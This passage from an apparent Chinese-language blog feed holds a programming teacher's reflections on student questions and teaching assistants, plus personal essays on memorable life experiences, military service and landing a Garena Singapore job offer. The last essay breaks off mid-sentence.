ABCDEFG，學生可能只抓得到 ABCDE，FG 只是聽過有個印象，或搞不好根本忘記有講過，過了兩週，可以只記得 ABC 了。這邊可以改善的地方是：</p><ol><li>該怎麼強調最重要的那幾項？讓學生最記得住？（增加質）</li><li>該怎麼設計教學內容，讓學生能記住的內容更多？（增加量）</li></ol><p>而儘管認識到了這點，有時候依然會因為這個不對等而產生情緒。例如說學生跑來問你一個問題，身為老師，你很清楚知道你有在課程上講過，搞不好還特別強調了三次，但學生還是跑來問了。這時候或許會產生一些情緒，心裡想著：「你真的有在上課嗎？我有特別強調過了」</p><p>但是對學生來說，本來就不可能記住所有上課的內容，對於那些不知道的內容，不知道就是不知道，雖然說線上課程可以再看一遍，但如果你其實只有其中一小段講到這概念，要找出來還是有一些難度。</p><p>我產生過這樣的情緒，但我沒有表現出來。原因是，我確實產生了比較負面的情緒，可是我的理性告訴我，這些情緒對於解決問題，是沒有什麼幫助的。</p><p>假設我順著情緒走，跟學生說：「你真的有上課嗎？我課程上都講過了，你再去看一遍吧」，那問題有得到解答嗎？或許有，可能他自己再回去看一遍，真的找到答案；或許沒有，也許他問的東西我只在課程中提了兩句，連我自己都找不到那兩句在哪。</p><p>既然這情緒對解決問題沒有幫助，甚至會幫倒忙，那自然也就沒有展現出來的理由。知易行難就是這種感覺吧，你知道情緒沒用，但就是會被情緒牽著走。幸好目前在這個部分我還能控制住，想的不是「我就是想要…」，而是「我該怎麼解決問題」。</p><p>不過麻煩的事情是，這個情緒會隨著教學的經驗變多，變得更加嚴重。原因是對我來說，我已經講過這東西五次了，每年都講一次，可是對學生來說，他們都只有聽過一次而已。所以因為這理由而責怪他們是不對的，這只是敗給情緒而已。</p><p>若是從解決問題的角度來講，要想的事情是：</p><ol><li>為什麼這問題一再出現？是不是因為課程中沒有讓學生留下深刻的印象</li><li>有沒有方法可以改進？例如說強調這一段，畫三個星星然後說考試會考</li><li>是不是可以準備一個常見問題集，讓學生自己去找答案？</li></ol><p>再次重申，說得容易做得難，在當下是會被情緒影響的，需要冷靜一陣子才能依靠理性做事。而這樣的轉換如果沒做好，受到情緒影響時是用忍耐的，那就會令人感到疲憊，倦怠感油然而生。</p><p>而且像是「我講過很多遍，但學生還是來問」或是「提醒過很多遍，但學生還是犯錯」的狀況，身為一個工程師，我自已會更無法接受，情緒的反應就更大。理由是，我很討厭同樣的事情做太多遍。就像是相同功能的 function 會抽出來而不是複製貼上一樣，如果有些事情一再發生，就應該找個方法解決掉。</p><p>但更麻煩且頭痛的事情是，界線要怎麼抓。白話文就是，當一個學生犯了一個你自認為提醒過的錯誤時，要怎麼知道是你的課程沒做好，還是學生自己沒看清楚課程，沒認真上課？</p><p>以前的我說過，我會選擇前者。如果是我課程沒做好，那理所當然要改進，如果是學生沒認真上課，那若是我課程再多加強 10%，可以使他更認真 10%，何樂而不為？我是那種，如果我多做點事可以讓整體結果更好，我就會多做點事情的人。</p><p>但前陣子我有想過，這樣真的好嗎？當我多做一點事情的時候，是不是學生就少了一些事情可以做？短期來看結果看似更好了，學生理解了，但如果學生的問題是自己沒認真上課，是不是根本問題還是沒解決。這樣的話，是一種愛之適足以害之嗎？</p><p>那在碰到這種狀況時，我該用什麼標準去決定我應該溫柔地回答學生問題，還是嚴厲地斥責，叫他再回去看一遍影片？</p><p>我目前還沒有答案。</p><h3 id="真的沒有所謂的蠢問題嗎？"><a href="#真的沒有所謂的蠢問題嗎？" class="headerlink" title="真的沒有所謂的蠢問題嗎？"></a>真的沒有所謂的蠢問題嗎？</h3><p>通常為了鼓勵學生勇於發問，老師都會說：「同學請盡量發問，沒有問題是多餘的，沒有問題是笨問題，只要你有問題就提出來」，我以前也是這樣的，因為若是有學生提了一個問題而被認定是蠢問題，他以後可能再也不會發問了。</p><p>但是，若是看到一些你真的很想稱之為蠢問題的問題，那又該怎麼辦？舉例來說，你可能一分鐘前才講過還說這個很重要，結果一分鐘後就被問了這個問題，這時候情緒就上來了，心底有股聲音告訴你：「這是什麼蠢問題？」，於是就開始懷疑：「真的所有的問題都值得被提出嗎？」</p><p>我之前處理的方式跟上面那個段落一樣，我不會表現出來，因為被情緒牽著鼻子走不會讓事情變得更好。假設我真的把這是蠢問題說出口，我可以得到一時間的情緒宣洩，但對於學生來說，他可能之後再也不提問了。所以長期來看，這是一個雙輸的局面。</p><p>想解決這個問題，我目前只有想到兩條路。第一條就是克制住情緒，等情緒過了就沒事了，第二條則是開闢一條新的道路，有沒有可能儘管我說這是蠢問題，但不會影響到學生提問的意願？</p><p>如果走第二條路，就要先在開始前就跟大家建立好共識，把說詞改成：「同學請勇於發問，有些問題確實是蠢問題，蠢的原因在於它很輕易就可以靠自己找到答案，但你沒有試著去找，或不知道可以這樣找。儘管你覺得某個問題很蠢，你還是應該要提出來，因為如果你沒提出來，你就不會知道答案」</p><p>我相信有些老師確實抱持著「沒有問題是蠢問題」這個心態，但同時我也相信學生應該很多人根本不認同「沒有問題是蠢問題」這個命題。如果是這樣的話，那是不是一開始就跟大家一起承認其實有蠢問題的存在比較好？先承認它存在，再去進一步講述為什麼蠢問題還是應該要提出來，而不是悶在心裡。</p><p>又或者，這其實是一個匿名提問機制就可以解決的事？如果沒人知道是你問的蠢問題，那是不是大家就都敢提問了？</p><p>或說不定可以有一個每天提問次數的上限，一天就是三次，不能累積，今天沒問完的扣打就沒了。而這個提問次數的限制其實用意正好相反，並不是為了「限制學生問問題」，而是透過次數的限制，吸引學生去問問題，大概就像是「再點 50 塊的東西就可以折 40 塊欸」的那種心態，你本來沒有想吃這麼多的，但看到優惠就忍不住了，想說不賺白不賺。</p><h3 id="教學方向的選擇"><a href="#教學方向的選擇" class="headerlink" title="教學方向的選擇"></a>教學方向的選擇</h3><p>教學有很多種路線，很多個方向。</p><p>例如說可以擔任資源的媒合者，自己不下去教學，幫學生找厲害的老師來講課，找想要徵才的企業，把資源都拉在一起，讓學生享受到很多資源。</p><p>也可以不走手把手教學，而是出一堆作業跟小專案，提供給學生大方向跟指導，其他學習的資源就讓學生自己去找。</p><p>還有一種是不可或缺的角色，就是真的手把手下去教的，從零開始一步步教，讓學生把基礎打好，真的學會這個技能。大多數的線上課程都可以算是這種。</p><p>我想做的一直都是這一種。我不想成為名字會出現在北車補習班招牌上的那種人，要拿這個做比喻的話，我想成為地方的小補習班裡面其中一位老師，學生人數少，但卻印象深刻。</p><p>總而言之，我想站在第一線去面對學生，而我也一直這樣做，直到最近開始有了些改變。</p><p>以程式導師實驗計畫來說，第一期大概 10 幾個人，第二期可能 30 個左右，但是到最近的第五期，就變成了 70 幾個人，而為了應付這樣的人數成長，我找了助教來改作業，所以作業都交給了助教（基本上都是以前的學生）來改，而學生有問題時也會比較頃向先問助教。</p><p>有些人可能會說：「這樣不是很好嗎？這樣不是就可以規模化了嗎？」，不，這樣不好。不是每個人都想把這個當成企業在做，不是每個人都想規模化，至少我就不是。</p><p>所以對我來說，我比較晚才意識到助教制度帶來的不全然只有好處。</p><p>有了助教以後我不用改作業了，而且助教還改得比我認真比我好，我也不需要一直回答問題了，有助教可以問，但如果把這些都拔掉之後，我還剩下什麼參與在課程中？只有那些錄好的教學影片嗎？</p><p>但其實這並不是助教制度的問題，而是我的問題。就算有助教改作業，難道我就不能再把作業看一遍嗎？我就不能自己多參與一些學生間的社群活動嗎？是我自己把自己限制住，或這樣講好了，是我的惰性使然。已經有人改作業了，懶惰的我怎麼會再看一次呢？</p><p>以前我在<a href="/2018/09/26/procrastination-ba12754ada49/">拖延症</a>的文章中寫過，我需要一些事情來推動我，如今我自己把這些事情給處理掉了，就沒有東西推動我了。解法有兩個，第一個是把助教制度砍掉，回歸成我自己處理一切事務，第二個則是要找到並存的方式，既有助教制度，又能夠推動我自己。</p><p>上述是前陣子累積的一些有關於教學的心得。趁著自己還記得時趕緊寫下來，否則過一陣子又會忘記了。</p><p>這篇教學的心得跟以往滿不一樣的，以前比較多的是針對教學內容的心得，這次比較多是心態面的東西，這一次的教學中我自己的心態確實跟以往有點不太一樣，但確切原因我也還不知道。</p><p>不過我相信只要能冷靜下來抱持著初心，以「解決問題為最優先」的態度去思考，應該就不會走得太偏。</p><p>「教學」的其中一種解釋是，兩個動詞指的都是老師而非學生，老師除了教以外，其實也在學，學著怎麼教學。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些印象深刻的經歷</title>
      <link href="/2021/09/19/experience-f37004cf80ff/"/>
      <url>/2021/09/19/experience-f37004cf80ff/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/experience-f37004cf80ff/0__mDYeWqxieDIp4VNJ.jpg"></p><p>會想寫這篇有兩個原因，第一個是看到 <a href="https://medium.com/u/e54b7fa62ad5">Lin Simon</a> 寫的<a href="https://medium.com/simons-murmur/%E9%97%9C%E6%96%BC%E9%82%A3%E4%BA%9B%E5%BD%B1%E9%9F%BF%E6%88%91%E4%BA%BA%E7%94%9F%E7%9A%84%E9%87%8D%E8%A6%81%E8%BD%89%E6%8D%A9%E9%BB%9E-3cde8fd493cb">關於那些影響我人生的重要轉捩點</a>，第二個是今年我的 Medium 好像沒發什麼文章，總覺得應該來寫些東西，找回一下手感。</p><p>這篇想寫的是一些自身經歷，而且是印象深刻的那種。有沒有影響人生我不知道，但能在目前活過的人生中特別被記起，一定是有著特別的原因。大家就當作在看故事吧，有些其實我以前在其他文章也有寫過了，但沒關係，看過的話就再看一次吧。</p><p>底下的五段回憶以時間排序，ORDER BY created_at ASC。</p><h3 id="創造的喜悅"><a href="#創造的喜悅" class="headerlink" title="創造的喜悅"></a>創造的喜悅</h3><p>在以前的文章裡面我應該有提過我第一次寫程式是在小學六年級。在開始學習以前，就像許多新手會做的一樣，上了論壇（程式設計俱樂部）發文問說應該怎麼開始，綜合一些建議之後，得出的結論是「去書店翻翻看，看得順眼就帶回家」。</p><p>去書店以後開始找起 VB 相關的書籍，那時因為 C++&#x2F;C 的大括號我看得頭很痛，所以早就已經決定要從比較簡單的 VB 開始。那時寫 VB 的人有大概六七成應該還在寫 VB6，只有一小部分的人寫當時最新的 VB.net，我翻書的時候翻到一本叫做「<a href="https://www.books.com.tw/products/0010328166">Visual Basic 2005 完美的演繹</a>」的書，覺得看起來滿不錯的，可以看懂，就回家上博客來訂書了。</p><p>等到書來了以後，第一件事就是環境建置，把該裝的東西都裝起來，然後按照書籍的教學一步步做出一個現在看來簡單到爆的程式。那個小程式總共有五個按鈕跟五個 label，按下按鈕之後，對應的 label 的字會改變。</p><p>雖然只是這樣簡單的功能，但那時的感覺我還依稀記得，大概就是「哇，我寫了一個會動的程式！太帥了吧！」，那是我初次體驗到寫程式的魅力以及「我只靠打字就可以創造出東西」的喜悅。</p><p>這就是我之後持續了十幾年的寫程式生涯的開端。</p><p>類似的喜悅再次發生，已經是高二的時候了，完全不熟物件導向的我胡亂地寫著 Java，用 J2ME 寫了一個可以在手機上面跑的藍芽連線橋牌對戰程式。</p><p>我到現在還是有點驚訝為什麼當時寫得出來，明明我就不懂 Java 也不懂藍芽連線，撲克牌的圖片也是網路上隨便找來的，總之就是一直查資料一直 debug，最後居然真的做出了個可以動的東西。</p><h3 id="永遠都不可能超越的人"><a href="#永遠都不可能超越的人" class="headerlink" title="永遠都不可能超越的人"></a>永遠都不可能超越的人</h3><p>從國中開始，我就有在參加一些資訊競賽。</p><p>先跟不知道什麼是資訊競賽的讀者們講解一下，資訊競賽比的寫程式不是「寫應用程式」，題目不會是寫一個 App 或是寫一個網站出來，而是比「寫程式解題目」，參賽者的目標就是透過寫程式去解決那些問題。</p><p>舉例來說，問題可能會像是：「今天給你三個數 a, b, c，請求出裡面的最大值」，用肉眼看大家都看得出來，但今天要用程式來解，所以你的程式要先讀取三個值，算出答案之後輸出，要通過主辦單位預先準備好的測試資料才算答對。</p><p>測試資料就是輸入以及正確的輸出，例如說 1, 7, 5 這組測試資料的正確輸出就是 7，背後可能會有上萬筆或更多準備好的測試資料，要確保你的程式針對每一筆輸入都產生正確的輸出。</p><p>到了高中之後也還是有陸陸續續在參賽，而這條路如果走到最頂尖，就是成為國手，代表台灣去參加一年一度的資訊奧林匹亞競賽。每年的比賽基本上就是地區賽（例如說北市賽之類的，台北市學校之間的對決），贏了可以進全國賽，全國賽贏了就進入資訊奧林匹亞競賽的選訓營，簡稱 TOI。</p><p>除了全國賽的前十名以外，還會另外舉辦選拔，叫做 TOI 入營考，取成績最高的 20 名，總共 30 人進入 TOI。而高一的我擠進了那 20 人的窄門，順利地進入了選訓營。</p><p>選訓營一共分為兩個階段，一個階段兩週，這兩週全部人都會住在師大的學生宿舍，平常白天就是在師大的電腦教室上課，以及準備每週一次的模擬考。第一階段結束時根據模擬考成績取前 12 名進入第二階段，再集訓兩週以後取前 4 名做為國手，代表國家出去參加比賽。</p><p>我高一的時候在第一階段止步，沒記錯的話最後成績是吊車尾的。</p><p>那兩週是記憶非常深刻的兩週，全台灣的資訊競賽強者都在這裡了。而有些人，你會覺得你一輩子都無法在這個領域超越他，就是強到爆炸。</p><p>在<a href="https://blog.jameshsu.csie.org/post/ntucsie-i/">《台大資工系紀實與心得 (1) — 天賦與實力的落差》</a>中有提到所謂的「電神與裝弱文化」，我覺得倒也不是真的裝弱，而是見識過更強的存在。我心目中的強者，他心中也有比他更厲害的人，而那個人心中也有，就算是領域頂尖的人物，應該也還是有幾個是實力差不多的，甚至每個人都在某一塊特別專精。</p><p>在這種狀況之下，是不會認為自己厲害的，這算是一種冒牌者症候群嗎？客觀來看確實處在一個很厲害的位置，但主觀來看並不覺得自己有哪裡特別出眾，因為跟心目中的強者比起來，實在是差得太遠了。</p><p>聽說有些從小都第一名的人到了第一志願高中或大學之後會很不習慣，因為自己不再是最厲害的那一個了，有些人無論你怎麼努力就是超越不了。我的話在高中就看過這群我認為永遠都贏不了的人了，所以沒有這種困擾。</p><p>話說回來，這樣的行為該叫做「認清自我」還是「畫地自限」？會不會因為這種念頭，所以就不再努力了？這我覺得好像倒不至於，因為那是個興趣。即使知道有人比我更厲害，而且我怎麼努力都超越不了，我還是會繼續做下去，繼續寫程式，因為那是興趣。</p><p>不過如果不是因為興趣，而是因為比賽的話，我就不知道了。在許多事情上，我是沒有這種一較高下的心情的。做好自己就行了。</p><h3 id="我是自由的"><a href="#我是自由的" class="headerlink" title="我是自由的"></a>我是自由的</h3><p>高二升高三的暑假為了升學衝刺，幾乎所有的人都會選擇參加暑期輔導，跟著老師一起準備大考，把握最後的暑假。而那時的我並不想參加這個活動。</p><p>不想參加的理由，大概是因為國中參加了暑期輔導之後我覺得沒太大幫助，有點浪費時間。我想自己念書，或是趁暑假的時候邊唸書邊耍廢。沒有「玩」這個理由，因為同學都參加了，也沒人陪我玩。</p><p>於是我找了個下課時間跑去問老師說：「老師，我可以不參加暑期輔導嗎？」，導師的回覆我至今仍然印象深刻，他說：「其實你不需要經過我的同意，你已經 17 歲了，這是你自己的決定，你想清楚就好」</p><p>對啊，為什麼我需要別人的同意才能決定要不要參加？這本來就是可以自由選擇的，所以我要說的應該是「老師，我決定不要參加暑期輔導」這種肯定句，而不是疑問句。</p><p>就在那個瞬間，跟艾主席一樣，我覺得我是自由的。</p><p>從那時候開始，我開始慢慢找回對自己人生的掌控權，這是我的人生，由我來決定要做什麼。其他人可以給建議，但做決定的是我。</p><p>而多年之後，這也影響了休學那個決定。不過休學並不在這篇文章的範疇當中就是了，對我來說那個印象反而沒那麼深刻。</p><h3 id="「很新創」的新創公司"><a href="#「很新創」的新創公司" class="headerlink" title="「很新創」的新創公司"></a>「很新創」的新創公司</h3><p>從以前開始我就一直在新創公司工作。</p><p>我的第二份實習在我大二的時候，是做旅遊的新創公司，產品是一個民宿的訂房平台以及管理後台，是我第一次在工作上寫網頁程式，用著還沒有很熟悉的 PHP 以及 jQuery。</p><p>由於這個產品要直接去跟民宿推銷，因此寒假實習時的地點在墾丁，包住，直接住某個民宿的房間一個月左右，每天就是學學寫 code 然後修 bug，就跟一般工程師沒兩樣。</p><p>而半年之後到了暑假，公司的重心轉往花蓮，在花蓮租了一間四房兩廳的屋子，總共 10 個人左右，在同一個屋簷下工作以及居住。</p><p>每天的行程很固定，早上根據排好的名單出去買早餐回來給大家吃，吃完之後就直接在長桌上面辦公，開始寫 code 修 bug，中午一樣兩三個人出去買便當，吃完之後繼續工作，一直到晚上六點半左右下班。</p><p>晚上好像都是出去吃比較多，一群人騎著機車去覓食，有時候還會去花蓮的海邊走走，那樣的生活其實挺愜意的。而有時候也會辦個讀書會，大家聚在客廳聽著老闆分享他偶像的故事，或是大家一起玩個德州撲克之類的。</p><p>那段回憶之所以難忘，是因為它符合了我心中對於「新創公司」的形象，就是幾個員工聚在一起，做著心目中理想的產品，設備簡陋了些，公司也沒什麼制度，但是大家彼此之間感情都很不錯，做起事來也很開心。有種在宿舍創業的那種感覺，早期可能有點辛苦但不會覺得累。</p><p>那是我第一次也是唯一一次加入這麼早期的新創公司。這之後雖然也都還是在新創居多，但加入時人數也都至少有 40 人以上了，已經過了新創最好玩、印象最深刻但也最容易倒閉的草創初期。</p><h3 id="自由的可貴與跨出同溫層"><a href="#自由的可貴與跨出同溫層" class="headerlink" title="自由的可貴與跨出同溫層"></a>自由的可貴與跨出同溫層</h3><p>看到這個標題，應該會有人猜得出是當兵吧？</p><p>要講我當兵的經歷之前，要先講講時空背景。首先，民國 83 年以後出生的人是當四個月的兵，而四個月的會一起當，我是 83 年 1 月前半段出生，所以我去當兵的時候，我一定是同梯裡面年紀數一數二大的。</p><p>再來，我是大二休學以後就去當兵的。綜合前面那點，可以知道同梯的人絕對不可能超過大二（除非是跳級啦）。因此，那時候會去當兵的人，要嘛就是跟我一樣大學唸到休學，要嘛就是高中職剛畢業，或甚至根本沒有畢業，才會跑來當兵。</p><p>對我來說，我同梯們所生活的世界跟我是截然不同的。對他們來說當兵是同溫層，對我則完全不然。</p><p>還記得第一次洗澡時，大家陸續脫掉了衣服，我就看到每一個都刺龍刺鳳的。平常在聊天時我幾乎都是抱持著一種增廣見聞的心態在聽他們說話，他們聊女人，聊改車，或甚至是聊自己的案底。</p><p>是的，裡面有幾個是有進過少年輔育院的，而他們的經歷對我來說確實是眼界大開，如果不是因為當兵，我根本沒有機會接觸到這個異溫層。</p><p>在軍中的那段時光，也體驗到了自由的可貴，這邊我直接貼以前寫在臉書的心得文好了：</p><blockquote><p><em>大約十天了。</em></p></blockquote><blockquote><p><em>我還記得，上個禮拜坐上開往苗栗的火車，坐上開往斗換坪的遊覽車，上車時的不安與緊張的心情。</em></p></blockquote><blockquote><p><em>當兵好玩嗎？不好玩，真的不好玩。</em></p></blockquote><blockquote><p><em>或許過個幾年回頭看會覺得別有一番風味，但哪些事情不是這樣？事情經歷過以後就過去了，當初的複雜心情也會被時間稀釋到淡的幾乎回想不起來。</em></p></blockquote><blockquote><p><em>在裡面感受最深的，就是自由，只有在裡面才會體驗到自由的可貴，因為在那邊你整天都必須按表操課，起床、盥洗、排隊、上課、午餐、午睡、上課、運動、晚餐、洗澡、睡覺，都有著固定的行程，牙刷跟牙膏怎麼擺也有規定，櫃子裡的衣服開口朝哪放哪邊也有規定，跟長官答話或是吃飯時的坐姿也有規定，總之軍中就是一堆，一堆的規定。</em></p></blockquote><blockquote><p><em>在裡面我有找到屬於自己的小確幸，像是我最喜歡的一段時間就是晚上就寢到睡著以前；我們大約是 9 點 45 分要到床上睡覺，但我不會馬上睡著，我習慣花一點時間想些事情，或是想念某些人事物，然後等到 10 點整，營區會放費玉清的晚安曲，我會聽完再睡，偶爾還會心裡跟著默唱幾句。</em></p></blockquote><blockquote><p><em>這是我最喜歡的時刻，因為這代表的一天的結束，代表著一天又過去了。</em></p></blockquote><blockquote><p><em>突然發現前面打的好像我很憂鬱很鬱悶似的，但其實還好，偶爾有點鬱悶而已，因為失去自由真的不會讓人太開心，何況我明天要收假回去了，但大多數其實沒什麼心情，就平平淡淡的。</em></p></blockquote><blockquote><p><em>在軍中操課滿累的，3.5 公斤的真槍拿久了手真的超痠，全副武裝帶頭盔也是滿頭大汗，儘管現在是冬天，但苗栗的天氣還是很不錯，幾乎每天都豔陽高照。除此之外，讓我困擾的是要背一堆東西，單戰報告詞或是軍歌歌詞，之前軍歌歌詞大家沒背熟，早點名的時候唱的零零落落，結果魔鬼班長立刻下令，晚上就寢前一人交五遍罰寫給他。</em></p></blockquote><blockquote><p><em>很多時候，我覺得我們根本就是國中生，而軍隊就是學校，只是是管理更嚴格而且沒有自由還要強制住校的學校。你在學校上課睡覺可能被老師點名起來罰站，但你也不會怕或怎樣，但是在軍隊你要是敢這樣，被點到可能就是被班長幹到飛高高，會用超大音量跟很兇的語氣斥責你。</em></p></blockquote><blockquote><p><em>我還沒有被這樣單獨點過，我也希望在結訓以前都不要，那感覺滿可怕的，而且我一定會被他們的超大音量嚇到。</em></p></blockquote><blockquote><p><em>當兵的生活就是很規律，做好自己的事情就好，但僅僅這樣還是不夠，為什麼？因為軍隊裡面有所謂的連坐法，就是一人犯錯整連受罰，你自己踏步踏得很好，答數答得很好，軍歌唱得很好，但只要其他人零零落落，就是大家一起重練一起基本教練，一直立正稍息立正稍息。</em></p></blockquote><blockquote><p><em>軍隊裡面只有整體，沒有個人。</em></p></blockquote><blockquote><p><em>而且天兵實在是滿多的，超級多，能天成那樣也是不太容易。</em></p></blockquote><blockquote><p><em>在裡面最有趣的事情就是那些同袍了，很多都是有在混的，常常在旁邊聽他們講話，像是被關的經驗，或是當酒店圍事的工作內容跟薪水待遇，或之前打群架的經歷等等，他們都很好相處，而且感覺超重義氣，講話也很靠背很好笑，認識他們應該是去從軍的最大收穫。</em></p></blockquote><blockquote><p><em>明天要收假了，微鬱悶。</em></p></blockquote><blockquote><p><em>但之後好像幾乎每個禮拜都會放，每次都可以倒數五天，應該會好過很多。</em></p></blockquote><p>七年後再回頭看那段時光，確實別有一番風味沒錯。前人說得對，給我一百萬換取當兵的回憶，不要；那一百萬叫我再當一次呢？我也不要。</p><p>話說當兵時最幸運的事莫過於第一階段時居然碰到同樣是附中的學弟，第二階段時又碰到了一個，而且朋友圈還有重疊，真的是很巧。</p><p>上面這五段都是我時不時會想起的回憶，是每當提及到「印象深刻」時就會想到的經歷。如果在看文章的你也有把對自己印象深刻的經歷寫起來，請務必讓我知道，我會去看的。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些人生中的轉折</title>
      <link href="/2021/09/10/when-i-got-sg-offer-e4d91856bd96/"/>
      <url>/2021/09/10/when-i-got-sg-offer-e4d91856bd96/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/when-i-got-sg-offer-e4d91856bd96/0__DIQI__wnPijhaJNmk.jpg"></p><p>這兩天在看臉書的動態回顧時，突然看到了五年前（2016 年 9 月 9 日）發的一篇網誌（可惜這功能現在已經死掉了），是我確定拿到新加坡的 offer 以後寫的，想說來當個文章小偷，偷自己臉書文章放到 Medium 好了。</p><p>2014 年 3 月，原本刻意把課表排成只剩兩天，決定其他時間都去實習的我，毅然決然的決定休學。這一休，我以為自己再也不會回去學校了。</p><p>2016 年 3 月，在為期兩年的休學時光中，居然讓我找到以前從沒想過的東西：「復學的理由」。</p><p>2016 年 7 月，辭掉了工作，終於又可以像學生一樣放個暑假，等待著 9&#x2F;11 開學的來臨。</p><p>可是，機會總是悄悄地來<br>無聲無息的<br>以一種<br>你從未想過的形式</p><p>「你好，這裡是 Garena Singapore，你高中的時候有參加過 TOI 對吧？我們最近在找優秀的 Software engineer，有興趣來試試看嗎？」</p><p>八月中，開學前一個月，我收到了這樣的訊息（這裡寫的內容跟原文不一樣，但意思有到就好，就不用太計較了）</p><p>哇塞，這是什麼情形？怎麼會這麼巧在這個時間點找到我。而且，找到我的方式也太奇特了吧！</p><p>TOI 是高中資訊奧林匹亞的選訓營，我高一的時候進去過一次，就這麼一次</p><p>找工作的時候，因為這個經歷年代久遠，我甚至到後來都索性不列在履歷上了，沒想到居然會有人透過這個經歷找到我</p><p>出國工作一直都是我的夢想之一，但每次這麼想的同時，我都會考慮到自己的能力。實在是不覺得我的能力可以勝任這份工作，於是我就回了：我好像不夠厲害、我大學非本科而且沒畢業、我很久沒碰演算法了等等的事實，最後得到一句：「你要面試看看嗎？」</p><p>其實會因為自己能力不足而放棄機會，無非就是怕面試被電，例如說一問三不知、英文面試聽不懂、回答得很爛等等，但如果排除這些因素，換個心情面對這些挫折的話，why not？</p><p>這讓我想起我當完兵開始瘋狂投履歷的時候，只要是 104 推薦給我的職缺我都投；就算這個職缺寫說需要 2~3 年工作經驗，或者是上面列的必備技能有些我不會，我都不管它。</p><p>「只管投就對了，反正你沒能力的話，公司自然會把你刷掉」當時的我，是抱著這樣的心情投履歷的。有的話就很好，沒有的話也沒差；與其妄自菲薄，不如先投再說。那些公司也不是笨蛋，如果真的很弱，自然不可能錄取。</p><p>總之，我最後決定試試看。於是就把我的履歷傳過去了（中文履歷也可以，真是幸運）</p><p>不得不說，Garena 的流程超級快，HR 大概隔天就聯絡我了，並且約三天後面試。因為他們總部在新加坡的關係，所以面試都是用 Skype 線上面試</p><p>第一次面試是跟一個前端工程師（因為我說我對前端比較有興趣），考了一些 JavaScript 跟 CSS，都還算是基本題，大概有八九成的題目我都有順利答出來，感覺很不錯</p><p>不意外的，一面通過了</p><p>接著我就去了北京十天，雖然 HR 有表示希望我去北京的時候，也可以抽出一點時間來面試，但我回絕了。因為我把面試看得滿重要的，我不希望在一個網路跟環境不穩定的狀況下面試（家裡最穩定，環境也比較熟悉），就決定北京回來之後再約</p><p>回來以後，約了八月底面試</p><p>二面的感覺跟一面截然不同，因為主要是考 Computer science 的基礎，也就是資工系必修的那些東西：作業系統、網路、演算法、資料結構、資料庫等等，而沒念過資工系又沒修過課的我，這些當然就是我的弱項</p><p>我剛剛都這樣講了，可見二面的表現不會太好。許多問題的回答都是：「呃…不好意思，這個我不清楚耶」、「這個我沒碰過，不太了解」、「這我不太確定」</p><p>面試完之後，我覺得我的神奇旅程應該就到這邊結束了。終於可以安心回去學校了！</p><p>結果超級意外的，我收到第三次面試的邀請，也就是 final interview，最後一關！</p><p>我超級驚訝，超級，也很感謝能有這個機會。我想說最後一關應該都是問一些個人特質或是經歷，應該不會聊什麼技術，所以心裡輕鬆很多。</p><p>兩天後，九月初的時候，正式挑戰最後一關</p><p>面試官是個比想像中還嚴肅的人，剛開始有小聊一下我的經歷：</p><p>「你不是寫代碼的嗎？怎麼跑去唸哲學系了」<br> 『因為我不喜歡物理跟化學，就去念文組了』<br> 「那數學呢？」<br> 『數學還好，沒有很討厭，但也沒有很厲害』<br> 「你真奇怪，一般寫代碼不都是理科很厲害嘛！這樣以後要看 paper 不就看不懂了」<br> 『嗯，是的，如果要看需要很多數學的 paper 可能就看不懂了』</p><p>結果除了問這些以外，也問到了技術問題，我後來跑去 Google 才發現原來是一道經典面試題：給你 n 個字串，找出重複次數最多的前 k 個。</p><p>這一題我答的也是頗爛，給出了一個很簡單就能想到的解法，而且時間複雜度還算錯，之後面試官還給我一點提示，但我還是答不出來。</p><p>大概只面了十幾分鐘，我的部分就結束了，換成我問他問題，幸好我事前有準備一些問題，不然這次面試就要創下最快結束的紀錄了。問題問完之後，最後一關也跟著結束</p><p>通話時間：20 分鐘，skype 是這樣跟我說的</p><p>我從沒有一次面試這麼短的，而且感覺得出來自己的表現欠佳</p><p>儘管事實是這樣告訴我的，但心裡難免抱著一絲絲期望，希望有奇蹟發生。面試的那天是禮拜四，我想說今明兩天可能就會有結果了，於是那兩天超緊張，收到新信的時候都不敢直接打開，要用「瞇」的</p><p>到了禮拜天，終於收到 Garena 的信，戰戰兢兢的打開一看：</p><p>「我們這邊希望能夠再面試最後一次，是跟一個資深工程師，不知道禮拜一或二方不方便？」</p><p>這結果真是出乎意料，不是 Yes 也不是 No，而是 One more chance。可是非常不巧，我禮拜一到三要參加創創的營隊，沒有辦法參加面試，於是就回信說不好意思，我要禮拜四才有空</p><p>接著，終於來到這段奇幻旅程最精彩的轉折處</p><p>禮拜一早上，我正在創創營隊玩遊戲的時候，收到一封信：</p><p>「不好意思，我們主管想加快面試流程，想請問你禮拜一或二能不能撥出一個小時的時間面試？」</p><p>雖然我之前有講過，我因為把面試看得很重要而不想在除了家以外的地方面試，可是對方都這樣講了，還是拒絕的話感覺我對這份工作很不重視。</p><p>「那個…我有一件事情想跟你討論，就是啊我最近在面試一間公司，他問我說我能不能抽出一個小時來面試。我看了一下活動流程，五點半到六點半這段是晚餐時間，可以讓我在這段期間面試嗎？還有，可以幫我借一台電腦嗎？感謝，不好意思提出這麼奇怪的要求」</p><p>在這邊再次感謝我的隊輔，答應了這突然其來的奇怪情況並且借了我電腦</p><p>於是，我的第四次，也是最後一次面試，是用著別人的 Windows 電腦，在桃園某處的會議室小桌子上進行的</p><p>這次的感覺跟第一次面試差不多，只是稍微遜色了一點，大概七八成的問題有答出來；但比起二三次，這次的感覺好很多了，無論是 coding 題還是一般的題目，至少都能夠說出一些東西。</p><p>「好了，我的問題就到這邊了，你有什麼要問我的嗎？」<br> 『沒有耶，我想問的上一次面試的時候都問完了』</p><p>通話時間：1 小時 20 分鐘</p><p>終於可以鬆一口氣，接下來就邊在營隊玩邊等結果就好。因為剛好在參加營隊，可以削弱很多等待的煎熬</p><p>還記得我說過，Garena 的效率很快嗎？</p><p>沒想到過了兩個小時，活動暫時告一段落，我拿起手機來看的時候，發現有一封新信，標題是：「Offer Letter」</p><p>那時候我才明白：「靠邀，原來收到國外的 offer 是這種感覺」</p><p>於是，我錄取了，成為了 Garena 新加坡的 